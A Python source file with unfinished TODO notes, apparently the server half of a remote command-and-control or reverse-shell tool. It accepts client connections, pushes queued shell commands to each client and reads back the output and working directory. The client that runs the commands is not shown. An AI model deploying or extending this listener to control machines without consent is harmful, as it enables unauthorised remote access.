import socket
import time
import threading

class SocketHandler:  # TODO COMPLETE REWORK
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.connection_list = []

    def run(self):
        # create a socket object
        sock = socket.socket()
        # bind the socket to all IP addresses of this host
        sock.bind((self.server_host, self.server_port))
        sock.listen(5)
        while True:
            # accept any connections attempted
            client_sock, client_ip = sock.accept()
            current_client = ClientHandler(client_sock, client_ip)
            self.connection_list.append([current_client, None])

    def looker(self):
        __con_lst = []  # Private look up table
        while True:
            # Compare connection_list with expected connection
            if not __con_lst == self.connection_list:  # Todo handle this better (?event?)
                for i in range(len(self.connection_list)):
                    elem = self.connection_list[i]
                    if not __con_lst.__contains__(elem[0]):
                        # Todo make sure all thread are generated at the same place
                        elem[1] = threading.Thread(target=elem[0].run).start() # TODO MOVE THE THREAD HANDLING IN THREAD HANDLER

                        __con_lst.append(elem[0])
                        self.connection_list[i] = elem


class ClientHandler:  # TODO COMPLETE REWORK

    def __init__(self, socket, ip):
        super(ClientHandler, self).__init__()
        self.ENCODING = 'utf-8'
        self.BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
        self.SEPARATOR = "<sep>"  # separator string for sending 2 messages in one go
        self.socket = socket
        self.ip = ip
        self.command = ''
        self.current_dir = ''
        self.last_response = ''
        self.id = None

    def run(self):

        # receiving the current working directory of the client
        self.current_dir, self.id = self.socket.recv(self.BUFFER_SIZE) \
            .decode(encoding=self.ENCODING).split(self.SEPARATOR)

        while True:

            # command = input(f'{current_dir} $> ')
            if not self.command:  # look if a command have been push
                time.sleep(1)
                continue  # noting to do

            # send the command to the client...
            self.socket.send((self.command.encode()))

            if self.command.lower() == 'exit':
                break  # ...then if the command is exit, just break out of the loop

            # retrieve command results then split command output and current directory
            self.last_response, self.current_dir, self.id = self.socket.recv(self.BUFFER_SIZE) \
                .decode(encoding=self.ENCODING).split(self.SEPARATOR)
            self.command = ''

    def close(self):
        self.socket.close()  # close server connection
